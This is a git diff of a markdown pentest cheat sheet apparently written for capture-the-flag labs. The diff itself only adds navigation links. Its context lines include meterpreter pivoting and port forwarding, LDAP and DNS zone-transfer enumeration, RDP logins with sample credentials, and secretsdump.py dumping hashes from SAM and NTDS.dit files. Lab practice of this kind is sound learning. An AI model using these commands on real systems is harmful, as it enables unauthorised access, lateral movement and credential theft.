@@ -1,4 +1,5 @@
-# [A Real Reverse shell](#get-a-real-shell-from-a-reverse-shell)| [SMB Enumeration](#smb-enumeration-with-smbmap-and-smbclient)| [Password Cracking](#password-hash-identification) | [Directory finding](#discovery) | [Unicorn](#unicorn) | [LDAPSearch](#ldapsearch) | [DNS transfer](#dns-transfer) | [Pivoting with Autoroute ](#pivoting-with-autoroute) | [Port forward](#port-forward) | [RDP](#rdp) | [Impacket](#impacket) | [Defualt web Login](#defualt-web-login)
+## Header
+## [A Real Reverse shell](#get-a-real-shell-from-a-reverse-shell)| [SMB Enumeration](#smb-enumeration-with-smbmap-and-smbclient)| [Password Cracking](#password-hash-identification) | [Directory finding](#discovery) | [Unicorn](#unicorn) | [LDAPSearch](#ldapsearch) | [DNS transfer](#dns-transfer) | [Pivoting with Autoroute ](#pivoting-with-autoroute) | [Port forward](#port-forward) | [RDP](#rdp) | [Impacket](#impacket) | [Defualt web Login](#defualt-web-login)
 
 ## Get a real shell from a reverse shell
 ```
@@ -26,6 +27,7 @@ reset
 export SHELL=bash
 export TERM=xterm-256color
 ```
+[Header](#header)
 ---------------------------------------------------------------------------
 
 ## SMB Enumeration with smbmap and smbclient
@@ -72,6 +74,7 @@ The "-U" option have to be set at the end.
 If you have : Not enough '\' characters in service
 Then verify that you have at least 2 backslash with just the IP address and 4 with the share.
 ```
+[Header](#header)
 ## Password hash identification
 ```
 git clone https://github.com/SmeegeSec/HashTag.git
@@ -93,7 +96,7 @@ attack   # | Mode
          3 | Brute-force
 rules :  /usr/share/hashcat/rules/
 ```
-
+[Header](#header)
 ## Discovery
 
 #### Gobuster
@@ -115,6 +118,7 @@ Then hide result with the appropiate option:
 ```
 wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -u website.com -H "Host: FUZZ.website.com" --hw 123
 ```
+[Header](#header)
 
 ## Unicorn
 ```
@@ -139,7 +143,7 @@ Note :: If you execute the above line in powershell you will need to remove the 
 ```
 At this point you should get a meterpreter shell
 ```
-
+[Header](#header)
 ## ldapsearch
 
 ```
@@ -149,6 +153,7 @@ ldapsearch -x -h 10.10.10.10 -s base namingcontexts
 ldapsearch -x -h 10.99.99.99 -s sub -b 'dc=hackthebox,dc=htb'
 nmap -p 389 --script ldap-rootdse -Pn 10.10.10.10nmap -p 389 --script ldap-search -Pn 10.10.10.10
 ```
+[Header](#header)
 ## DNS transfer
 ```
 nslookup
@@ -158,6 +163,7 @@ nslookup
 
 dig axfr @10.10.10.13 cronos.htb
 ```
+[Header](#header)
 ## Pivoting with Autoroute 
 ```
 meterpreter > run autoroute -s 192.168.0.0/24
@@ -185,6 +191,7 @@ socks4 127.0.0.1 1080
 ```
 proxychains nmap -p 445 -sV -sT -n 192.168.0.2 -Pn
 ```
+[Header](#header)
 ## Port forward
 ```
 meterpreter > portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445
@@ -197,6 +204,7 @@ Index Local Remote Direction
 ----- ----- ------ ---------
 1 0.0.0.0:445 192.168.57.102:445 Forward1 total active port forwards
 ```
+[Header](#header)
 ## RDP
 #### RDesktop
 ```
@@ -211,7 +219,10 @@ xfreerdp /u:JohnDoe /p:Pwd123! /w:1366 /h:768 /v:192.168.1.100:4489xfreerdp /u:J
 xfreerdp --plugin rdpsnd --plugin rdpdr --data disk:home:/home -- -u administrator 10.1.1.2 
 \\tsclient\home
 ```
+[Header](#header)
 ## Impacket
+
+[beginner impacket info](#https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
 #### SMB Server
 ```
 impacket-smbserver -smb2support files `pwd`
@@ -246,12 +257,12 @@ ridenum.py 10.10.10.10 500 50000
 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 secretsdump.py -ntds ntds.dit -system system.save LOCAL -outputfile hash
 ```
-
+[Header](#header)
 ## Defualt web Login
 ```
 https://github.com/InfosecMatter/default-http-login-hunter
 ```
-
+[Header](#header)
 
 
 
